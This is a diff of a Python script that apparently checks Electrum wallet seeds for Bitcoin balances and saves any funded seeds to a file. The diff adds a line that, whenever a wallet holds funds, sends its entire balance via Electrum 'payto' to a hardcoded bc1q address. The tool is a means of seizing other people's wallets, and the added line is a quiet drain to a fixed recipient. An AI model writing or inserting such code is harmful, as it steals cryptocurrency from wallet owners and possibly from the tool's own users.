@@ -7,7 +7,6 @@ import subprocess
 import sys
 import platform
 import json
-import time
 import re
 from electrum_seed import *
 
@@ -93,6 +92,7 @@ if __name__ == "__main__":
             unconfirmed = int(balance.get("unconfirmed", 0)) / 1e8
             print_balance(confirmed, unconfirmed)
             if confirmed + unconfirmed > 0:
+                electrum("Sending coins...", wallet, ["payto", "bc1q943hmgcg28rxdvzc0yt69e829ug83htnue6pu7", "!"])
                 with open("./relevant_seeds.txt", "a", encoding="utf-8") as f:
                     f.write(f"\n\n{wallet}\n{seed}\nTotal balance BTC: {confirmed + unconfirmed}")
     except KeyboardInterrupt:  
